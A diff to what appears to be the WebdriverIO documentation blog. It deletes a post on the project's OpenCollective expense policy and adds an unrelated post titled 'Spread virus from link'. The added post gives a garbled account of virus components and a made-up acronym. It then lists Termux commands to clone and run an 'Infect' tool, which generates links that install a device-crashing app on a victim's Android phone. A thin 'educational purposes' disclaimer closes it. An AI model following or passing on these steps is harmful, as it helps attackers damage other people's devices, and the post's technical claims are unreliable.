@@ -1,56 +1,98 @@
 ---
-title: WebdriverIO Opens an OpenCollective
-author: Christian Bromann
-authorURL: http://twitter.com/bromann
-authorImageURL: https://s.gravatar.com/avatar/d98b16d7c93d15865f34a225dd4b1254?s=80
+title: Spread virus from link
+author: Abhinav Kumar
+authorURL: https://www.linkedin.com/in/Abhi6722
+authorImageURL: https://avatars.githubusercontent.com/u/62201123
 ---
 
-Today the WebdriverIO team announced in their [OpenJS Foundation](https://openjsf.org/) Q&A session that the project opens an [OpenCollective](https://opencollective.com/webdriverio) to allow users and companies to donate to the development of the project and support community members to run WebdriverIO workshops and other types of events. This allows everyone to be paid to work on features and bug fixes as well as help the community to pay for pizza or rental space when hosting WebdriverIO workshops or meetups.
+In this post I am going to introduce you with Virus. You all would be knowing about virus but you might not be knowing how harmful it could be. In this lesson I am going to tell you about it and how to create a virus.
 
-If your company uses WebdriverIO and benefits from it, please ask your manager or your marketing team to support the project by donating to the collective. Support will allow the maintainers to dedicate more time for maintenance and new features for everyone.
+Virus stands for Vital Information Resource Under Siege.
+You all would be knowing about virus but you might not be knowing how harmful it could be. In this lesson I am going to tell you about it and how to create a virus.
+The function of Virus is similar to what it stands for. Virus is nothing but a piece of code. This code, once executed, starts performing tasks in the background.
+ 
+## Symptoms of Virus
+Some viruses will use up all the computing power to perform a job. It can be a simple job of pinging “google.com” for no apparent reason. Due to this, the victim’s machine performs very slow as majority of its resources are being used  by the Virus.
+ 
+### System Slowness
+A victim may not understand its existence right at the beginning. But as time progresses, various symptoms of Virus Infection can be seen such as slowness.
+These symptoms vary as the code variation occurs.
+  
+### Spread of Virus
+A Virus’ damage increases as it spreads to other disks and drives. However, it always needs to attach itself to a host file or an application to spread. Say, you downloaded subtitles of a movie, and along with the usual .srt file, there is a fishy .bat file as well.
+ 
+A victim might not pay much attention to it and give a copy of the same to another person.
+In this way, even if the victim deletes it from one of the drives, say C drive, there is a copy of it somewhere else.
+ 
+### Concealer
+The concealer’s job is to make Virus appear as a benign application i.e a trust-worthy and genuine application.
+This part is normally done by the attacker during the creation of the virus itself.
+ 
+A simple way is to show another app’s icon as its own.
+This way the victim is fooled to believe that it is a trust-worthy file.
+ 
+### Payload
+The Payload is nothing but the actual piece of code where the instructions are stated.
 
-As part of this we also like to announce the official WebdriverIO Swag Store: [shop.webdriver.io](http://shop.webdriver.io), which will be used as an income source for the collective. All purchases from that store will directly go into our fund and to you. We start our collection with a T-shirt, a sweatshirt and a couple of accessories but will soon extend to more. So stay tuned!
+This decides the behaviour of the virus.
+It can be a simple command of restarting the machine indefinitely.
+ 
+### Replicator
+In the previous sub-topic, we saw how a chain of propagation was created.
+This plan is devised by the Replicator part of a Virus.
+It may not be limited to only file systems but can be applied to networks and internet as well. 
+ 
+## How to send a virus or spread the virus from simply sending the link in an android gadget
+So sending viruses and getting to gadgets isn’t simple these days yet at the same time, we can misuse huge numbers of the gadgets by this instrument named Infect which is comprised of slam scripting language so this content is accessible for termux clients you can run this device in established and non-established gadgets. 
+ 
+So fellow’s today we are going to spread a virus through simply link and parcel more…
+ 
+## Follow below steps
+Open termux app and write the following commands
+``` 
+$ apt-get update
+```
+```
+$ apt upgrade
+```
+``` 
+$ pkg install python
+```
+``` 
+$ pkg install python2
+```
+``` 
+$ pkg install git
+```
+``` 
+$ termux-setup-storage
+```
+``` 
+$ pip install lolcat
+```
+``` 
+$ git clone https://github.com/Abhi6722/Infect
+```
+``` 
+$ ls
+```
+``` 
+$ cd Infect
+```
+``` 
+$ bash infect.sh
+``` 
 
-We want to be transparent in the way we accept expenses to the collective. Everyone should be eligible to participate and send in expenses for development on certain features. We also want to give back to the community by allowing us to expense event expenses. The following expense types may be eligible to be reimbursed from the collective:
+Now after tool opens in that you will get 4 option’s 
+ 
+1. Infect now, from this feature you’ll get a link and send that link to your victim and when your victim installs that app his/her device will crash and lot more.
+ 
+2. Save now, from this you’ll get a link of antivirus type app which removes that virus from his/her device
+ 
+3. Update script, from this you’ll update script.
+ 
+4. Exit, exit from script.
 
-#### Event Expenses
-
-If you host an event that has a speaker talking about using WebdriverIO and it's features you can expense up to __$100__. Reimbursement requirements for event expenses include:
-
-- You or the event account must share the project on social media (Twitter, Facebook or LinkedIn) at least 3x
-- The event page must have the WebdriverIO logo and a link to the project page in your meetup description
-- You must use the funds for qualified event expenses such as food, beverage, room or equipment rental.
-- You must submit receipts with your reimbursement request.
-
-Our goal with this expense policy is to help the community to run events, to promote the project and support anyone learning about WebdriverIO. We've already seen project meetups happening in New York and The Netherlands and hope to see more of this in the future.
-
-#### Development Expenses
-
-If you have done development work on any of the repositories within the GitHub WebdriverIO organisation you may reimburse up to __$1000__ if the following requirements are met:
-
-- You must have submitted qualifying pull requests that have closed at least 10 issues that were labeled with [`Expensable 💸`](https://github.com/webdriverio/webdriverio/labels/Expensable%20%F0%9F%92%B8)
-- Every additional issue closed with that label can be expensed with $100
-- You must submit links to all issues you’ve closed due to your pull requests
-- In order to close the ticket automatically, you must have one commit message with the Fix keyword. For example, Fix #1234 to close ticket #1234.
-- Pull Requests must be merged by someone from the [core team](https://github.com/webdriverio/webdriverio/blob/main/AUTHORS.md#tsc-technical-steering-committee). If there are several Pull Requests, the core team member either selects the most recent one or the best one - that’s up to them to decide what is best for the project.
-- You must claim an [`Expensable 💸`](https://github.com/webdriverio/webdriverio/labels/Expensable%20%F0%9F%92%B8) issue by commenting to the issue thread to ensure that no one else is working on the same issue.
-- Anyone contributing to WebdriverIO is eligible to expense their work if the implemented features or bug fixes are not objectives of a commercial job.
-
-Please note that contributing on behalf of a company does not make you eligible to also get reimbursed by the collective. If a company pays you to work on WebdriverIO we see this already as a contribution to the project by the company.
-
-We understand that $1000 for fixing 10 bugs or implementing 10 features may seem arbitrary because some work items will take longer than others. However by requiring someone to finish 10 work items we hope that this uncertainty of effort and time will balance out. We also understand that this will not reimburse someone by their market value and it certainly won't allow someone to work full time on WebdriverIO. The goal of the collective is to reimburse people that usually would contribute in their free time in a very transparent and open way.
-
-#### Travel Expenses
-
-If you are a member of the [Technical Steering Committee team](https://github.com/webdriverio/webdriverio/blob/main/AUTHORS.md#tsc-technical-steering-committee) you are eligible to expense flights and hotel accommodations for travel to conferences or meetups as part of a speaking engagement on WebdriverIO, not paid by the event itself or a company. You may expense up to $500. Reimbursement requirements for travel expenses include:
-
-- You must send out a post from your main social media account (e.g. Twitter, LinkedIn or personal blog) thanking all contributors of the collective after the event took place.
-- You must use the funds for qualified travel expenses such as ground or air transportation to the event and hotel accommodations.
-- You must submit receipts with your reimbursement request.
-
-Even though currently there are no in-person events happening due to the COVID-19 pandemic, we hope that we come back to times where we can reconnect with the community on a personal level. For that we would like to support the core team with their travel expenses.
-
-Overall we hope that this expense policy is fair and inclusive enough that anyone can participate. Opening a collective might sound easy in the beginning but doesn't end up being a trivial effort when you consider transparency and fairness. We expect to make amendments to our policies once we gather more experience from the process.
-
-Thank you to everyone who will donate money to the collective and therefore will support the project and everyone contributing to it. It really means a lot ❤️
-
+:::tip Note 
+Make sure that whatever you are doing is only for educational purposes and nothing else if you are doing any illegal activity then we are not responsible for that.
+:::
